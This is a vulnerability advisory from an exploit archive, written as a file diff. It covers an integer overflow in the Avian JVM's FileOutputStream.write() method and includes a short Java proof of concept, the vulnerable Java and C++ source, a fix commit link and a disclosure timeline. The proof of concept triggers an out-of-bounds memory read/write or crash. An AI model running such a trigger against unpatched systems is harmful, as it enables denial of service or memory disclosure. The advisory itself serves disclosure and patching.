@@ -1,0 +1,121 @@
+id: 35226
+date: 11/14/2020
+title: ReadyTalk Avian JVM FileOutputStream.write() Integer Overflow Exploit
+author: Pietro Oliva
+cves: 
+
+Vulnerability title: Avian JVM FileOutputStream.write() Integer Overflow
+Author: Pietro Oliva
+Vendor: ReadyTalk
+Product: Avian JVM 
+Affected version: 1.2.0 before 27th October 2020
+Fixed Version: 1.2.0 since 27th October 2020
+
+Description:
+The issue is located in the FileOutputStream.write() method defined in
+FileOutputStream.java, where a boundary check is performed in order to prevent
+out-of-bounds memory read/write. However, this check contained an integer 
+overflow which leads to the same check being bypassed and out-of-bounds 
+read/write.   
+
+Impact:
+Attackers could exploit this vulnerability to read/write arbitrary content in
+the JVM memory. This could in turn result in denial of service, memory 
+disclosure, or arbitrary code execution in the context of the JVM.
+
+Exploitation:
+The following PoC would trigger an OOB read/write and/or crash of Avian JVM:
+
+import java.io.IOException;
+import java.io.FileDescriptor;
+import java.io.FileOutputStream;
+
+public class poc {
+
+  public static void main(String[] args) throws IOException {
+      byte[] data = "somedata".getBytes();
+      FileDescriptor fd = new FileDescriptor().out;
+      FileOutputStream fos = new FileOutputStream(fd);
+
+      fos.write(data, 1, 0x7fffffff); // Integer overflow + OOB read/write here
+  }
+}
+
+
+Evidence:
+
+public void write(byte[] b, int offset, int length) throws IOException {
+  if (b == null) {
+    throw new NullPointerException();
+  }
+
+  if (offset < 0 || offset + length > b.length) { // Integer overflow here
+    throw new ArrayIndexOutOfBoundsException();
+  }
+
+  write(fd, b, offset, length);
+}
+
+extern "C" JNIEXPORT void JNICALL
+    Java_java_io_FileOutputStream_write__I_3BII(JNIEnv* e,
+                                                jclass,
+                                                jint fd,
+                                                jbyteArray b,
+                                                jint offset,
+                                                jint length)
+{
+  jbyte* data = static_cast<jbyte*>(malloc(length));
+
+  if (data == 0) {
+    throwNew(e, "java/lang/OutOfMemoryError", 0);
+    return;
+  }
+
+  e->GetByteArrayRegion(b, offset, length, data);
+  if (not e->ExceptionCheck()) {
+    doWrite(e, fd, data, length);
+  }
+
+  free(data);
+}
+
+void JNICALL GetByteArrayRegion(Thread* t,
+                                jbyteArray array,
+                                jint offset,
+                                jint length,
+                                jbyte* dst)
+{
+  ENTER(t, Thread::ActiveState);
+
+  if (length) {
+    // Out-of-bounds read/write here
+    memcpy(dst, &(*array)->body()[offset], length * sizeof(jbyte));
+  }
+}
+
+As can be observed above, offset+length can overflow in FileOutputStream.write()
+and later result in OOB read/write during memcpy() in GetByteArrayRegion().   
+
+Mitigating factors:
+Since offset needs to be a positive integer, and length is limited to a valid
+malloc argument, there is a limited range of memory where an attacker could read
+or write as a result of this vulnerability.
+
+Remediation:
+
+A fix has been made available with the following commit:
+https://github.com/ReadyTalk/avian/commit/0871979b298add320ca63f65060acb7532c8a0dd
+
+Disclosure timeline:
+20th October 2020  -  Vulnerability reported.
+20th October 2020  -  Vulnerability acknowledged.
+20th October 2020  -  CVE request sent to Mitre.
+23rd October 2020  -  Sent reminder to Mitre.
+27th October 2020  -  Sent reminder to Mitre.
+27th October 2020  -  Patch proposed via pull request.
+27th October 2020  -  Patch merged into master branch.
+29th October 2020  -  Sent reminder to Mitre.
+2nd November 2020  -  CVE request sent again to Mitre.
+11th November 2020  - Vulnerability details shared on fulldisclosure without CVE identifier.
+
+#  0day.today [2023-03-23]  #
